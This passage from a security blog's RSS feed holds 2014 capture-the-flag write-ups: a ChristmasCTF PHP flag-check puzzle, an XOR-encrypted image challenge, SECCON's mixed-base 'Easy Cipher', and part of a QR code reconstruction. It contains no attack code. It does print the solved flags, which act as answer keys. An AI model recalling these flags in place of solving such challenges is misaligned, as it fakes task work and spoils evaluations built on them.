&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;for ($i = 1; $i &lt;span class=&quot;nt&quot;&gt;&amp;lt; count&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;flag_array&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;flag_array&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;flag_array&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;5;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_GET&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;][$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;].$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_GET&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fIag&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;][$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;flag_array&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;].$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_GET&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fIag&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;][$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;wrong&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위 코드로부터 아래의 것들을 유추할 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;$_GET[flag][5] = &quot;7&quot;;
$_GET[flag][6] = &quot;o&quot;;
$_GET[flag][7] = &quot;_&quot;;
$_GET[flag][8] = &quot;d&quot;;
$_GET[flag][9] = &quot;0&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그 다음은 &lt;code&gt;$flag_len&lt;/code&gt;입니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;$flag_len = strlen($_GET[flag]);
$length_chk = 1;
while ($flag_len &amp;gt; 1) $length_chk += $flag_len -= 1;
if (($length_chk &lt;span class=&quot;nt&quot;&gt;&amp;lt; 110&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length_chk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; 130)) exit(&quot;wrong&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;$_GET[flag]&lt;/code&gt;가 16글자가 되어야 한다는 사실을 알 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;$stage3 = substr($_GET[flag], -7);
$stage3_1 = substr($stage3, 0, 6);
$stage3_2 = substr($stage3, 1, 6);
$tmp = &quot;stage3_&quot;;
for ($i = 0; $i &lt;span class=&quot;nt&quot;&gt;&amp;lt; 6&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stage3_1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stage3_2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[$&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stage3_143193195211162158&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;wrong&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;You&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;did&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;!&amp;lt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Flag is {&lt;span class=&quot;nt&quot;&gt;&amp;lt;strong&amp;gt;&lt;/span&gt;&quot; . $_GET[flag] . &quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/strong&amp;gt;&lt;/span&gt;}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;$_GET[flag]&lt;/code&gt;의 뒤에서부터 7글자를 알아낼 수 있는데, 뒤에서 7번째 글자는 이미 &lt;code&gt;0&lt;/code&gt;으로 정해져 있으므로 거기에서 &lt;code&gt;chr(143 - ord(&amp;#39;0&amp;#39;))&lt;/code&gt;은 &lt;code&gt;_&lt;/code&gt;, &lt;code&gt;chr(193 - ord(&amp;#39;_&amp;#39;))&lt;/code&gt;은 &lt;code&gt;b&lt;/code&gt;, &amp;hellip;의 방식으로 끝까지 유추할 수 있습니다.&lt;/p&gt;

&lt;p&gt;Flag는 &lt;code&gt;time_7o_d0_bar0n&lt;/code&gt;입니다.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;trace&quot;&gt;&lt;/a&gt;Trace - MISC100&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Just Find a Key&lt;/p&gt;

&lt;p&gt;Flag: 0xff&lt;br&gt;
988087853 + k3y + IMG(png)&lt;/p&gt;

&lt;p&gt;Hint: Its Decimal. u can change to Dotted Decimal.&lt;br&gt;
Hint2: its IP Address in Decimal. therefore =&amp;gt; &lt;a href=&quot;http://988087853/k3y.png&quot;&gt;http://988087853/k3y.png&lt;/a&gt; and image has been encrypted. try decrypt&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;988087853은 사실 IP 주소를 의미합니다. &lt;a href=&quot;http://988087853&quot;&gt;http://988087853&lt;/a&gt;으로 접속하면 우리에게 익숙한 IP로 변환됩니다. &lt;a href=&quot;http://58.229.6.45&quot;&gt;http://58.229.6.45&lt;/a&gt;군요. &lt;code&gt;/k3y.png&lt;/code&gt; 파일을 &lt;a href=&quot;/downloads/2014/12/26/k3y.png&quot;&gt;받아 봅시다&lt;/a&gt;. 헥스 에디터를 통해 파일을 보게 되면 첫 4바이트가 &lt;code&gt;0x76 0xAF 0xB1 0xB8&lt;/code&gt;인데, &lt;code&gt;0xFF&lt;/code&gt;와 XOR 해봅시다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x76\xAF\xB1\xB8&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# =&amp;gt; [&quot;\x89&quot;, &quot;P&quot;, &quot;N&quot;, &quot;G&quot;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;파일 전체가 &lt;code&gt;0xFF&lt;/code&gt;와 XOR 되어 있는 상태입니다. XOR 하면 제대로 된 이미지를 볼 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;k3y.png&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;rb&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;k3y_xor.png&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;wb&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그렇게 얻은 이미지는 아래와 같습니다:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2014/12/26/k3y_xor.png&quot; alt=&quot;k3y_xor.png&quot; title=&quot;k3y_xor.png&quot;&gt;&lt;/p&gt;

&lt;p&gt;Flag는 &lt;code&gt;ASKY_ALWAYS!&lt;/code&gt;입니다.&lt;/p&gt;
</description>
        <pubDate>Fri, 26 Dec 2014 00:41:26 +0900</pubDate>
        <link>http://yous.be/2014/12/26/christmasctf-2014-write-up/</link>
        <guid isPermaLink="true">http://yous.be/2014/12/26/christmasctf-2014-write-up/</guid>
        
        
        <category>CTF</category>
        
      </item>
    
      <item>
        
        <title>SECCON CTF 2014: Easy Cipher Write-up</title>
        
        <description>&lt;h2&gt;Crypto100 - Easy Cipher&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;87 101 108 1100011 0157 6d 0145 040 116 0157 100000 0164 104 1100101 32 0123 69 67 0103 1001111 1001110 040 062 060 49 064 100000 0157 110 6c 0151 1101110 101 040 0103 1010100 70 101110 0124 1101000 101 100000 1010011 1000101 67 0103 4f 4e 100000 105 1110011 040 116 1101000 0145 040 1100010 0151 103 103 0145 1110011 0164 100000 1101000 0141 99 6b 1100101 0162 32 0143 111 1101110 1110100 101 0163 0164 040 0151 0156 040 74 0141 1110000 1100001 0156 056 4f 0157 0160 115 44 040 0171 1101111 117 100000 1110111 0141 0156 1110100 32 0164 6f 32 6b 1101110 1101111 1110111 100000 0164 1101000 0145 040 0146 6c 97 1100111 2c 100000 0144 111 110 100111 116 100000 1111001 6f 117 63 0110 1100101 0162 0145 100000 1111001 111 117 100000 97 114 0145 46 1010011 0105 0103 67 79 1001110 123 87 110011 110001 67 110000 1001101 32 55 060 100000 110111 0110 110011 32 53 51 0103 0103 060 0116 040 5a 0117 73 0101 7d 1001000 0141 1110110 1100101 100000 102 0165 0156 33&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It looks like a set of numbers split with space. But there are multiple integer bases.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;nums&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;%w(87 101 108 1100011 0157 6d 0145 040 116 0157 100000 0164 104 1100101
          32 0123 69 67 0103 1001111 1001110 040 062 060 49 064 100000 0157 110
          6c 0151 1101110 101 040 0103 1010100 70 101110 0124 1101000 101 100000
          1010011 1000101 67 0103 4f 4e 100000 105 1110011 040 116 1101000 0145
          040 1100010 0151 103 103 0145 1110011 0164 100000 1101000 0141 99 6b
          1100101 0162 32 0143 111 1101110 1110100 101 0163 0164 040 0151 0156
          040 74 0141 1110000 1100001 0156 056 4f 0157 0160 115 44 040 0171
          1101111 117 100000 1110111 0141 0156 1110100 32 0164 6f 32 6b 1101110
          1101111 1110111 100000 0164 1101000 0145 040 0146 6c 97 1100111 2c
          100000 0144 111 110 100111 116 100000 1111001 6f 117 63 0110 1100101
          0162 0145 100000 1111001 111 117 100000 97 114 0145 46 1010011 0105
          0103 67 79 1001110 123 87 110011 110001 67 110000 1001101 32 55 060
          100000 110111 0110 110011 32 53 51 0103 0103 060 0116 040 5a 0117 73
          0101 7d 1001000 0141 1110110 1100101 100000 102 0165 0156 33)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nums&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ord&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elsif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/[a-f]/&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elsif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start_with?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;0&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Just run with Ruby:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to the SECCON 2014 online CTF.The SECCON is the biggest hacker contest in Japan.Oops, you want to know the flag, don&#39;t you?Here you are.SECCON{W31C0M 70 7H3 53CC0N ZOIA}Have fun!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally the flag is:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;SECCON{W31C0M 70 7H3 53CC0N ZOIA}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        <pubDate>Tue, 09 Dec 2014 00:11:30 +0900</pubDate>
        <link>http://yous.be/2014/12/09/seccon-ctf-2014-easy-cipher-write-up/</link>
        <guid isPermaLink="true">http://yous.be/2014/12/09/seccon-ctf-2014-easy-cipher-write-up/</guid>
        
        
        <category>CTF</category>
        
      </item>
    
      <item>
        
        <title>SECCON CTF 2014: QR (Easy) Write-up</title>
        
        <description>&lt;h2&gt;QR200 - QR (Easy)&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Funniest joke in the world(?):&lt;br&gt;
&amp;ldquo;Last night, I had a dream I was eating QR cakes&amp;hellip;.&lt;br&gt;
but when I woke up, half my QR code was gone!&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2014/12/07/DSC01964_s.JPG&quot; alt=&quot;QR (Easy)&quot;&gt;&lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;世界一面白いジョーク：&lt;br&gt;
昨晩フランネルケーキを食べる夢を見たんだけど、&lt;br&gt;
朝起きたらQRコードが半分なくなってたんだ！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;!-- more --&gt;

&lt;h2&gt;First Look&lt;/h2&gt;

&lt;p&gt;At first, we need clean image based on the image above.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2014/12/07/skeleton_qr.png&quot; alt=&quot;Skeleton QR code&quot; title=&quot;Skeleton QR code&quot;&gt;&lt;/p&gt;

&lt;p&gt;The size of this QR code is 29x29 and the size of version &lt;em&gt;V&lt;/em&gt; is &lt;em&gt;N &amp;times; N&lt;/em&gt; with &lt;em&gt;N = 17 + 4V&lt;/em&gt;, so this is version 3.&lt;/p&gt;

&lt;h2&gt;Format Information&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/images/2014/12/07/qr_format_information.png&quot; alt=&quot;Format information&quot; title=&quot;Format information&quot;&gt;&lt;/p&gt;

&lt;p&gt;Note that the area indicates format information of QR code. Actually the format information is 15 bits long and the area has last 8 bits.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2014/12/07/format_information_bits.png&quot; alt=&quot;Format information bits&quot; title=&quot;Format information bits&quot;&gt;&lt;/p&gt;

&lt;p&gt;Searching &lt;a href=&quot;http://www.thonky.com/qr-code-tutorial/format-version-tables/#list-of-all-format-information-strings&quot;&gt;the list of all format information strings&lt;/a&gt;, we can find out that the type information bits are &lt;code&gt;001001110111110&lt;/code&gt;. So this QR code has ECC level H and mask pattern 1.&lt;/p&gt;

&lt;h2&gt;Off the Mask&lt;/h2&gt;

&lt;p&gt;According to &lt;a href=&quot;http://www.thonky.com/qr-code-tutorial/mask-patterns/&quot;&gt;QR Mask Patterns Explained&lt;/a&gt;, mask number 1 has formula &lt;code&gt;(row) mod 2 == 0&lt;/code&gt;. Note that the row number start from 0. So we have to switch the bit of the row of which the coordinate is 0, 2, 4, &amp;hellip;, 28.&lt;/p&gt;

&lt;p&gt;Also there are fixed patterns in QR code, so we have to switch bits of data section only. See the data area and the bit order.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2014/12/07/QR_Ver3_Codeword_Ordering.svg&quot; alt=&quot;QR Ver3 Codeword Ordering&quot; title=&quot;QR Ver3 Codeword Ordering&quot;&gt;&lt;br&gt;
(via &lt;a href=&quot;http://commons.wikimedia.org/wiki/File:QR_Ver3_Codeword_Ordering.svg&quot;&gt;wikipedia.org&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;So, the raw D1&amp;ndash;D26 are:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;D1&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11101100&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b10000010&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D2&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11111000&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b10010101&lt;/span&gt;
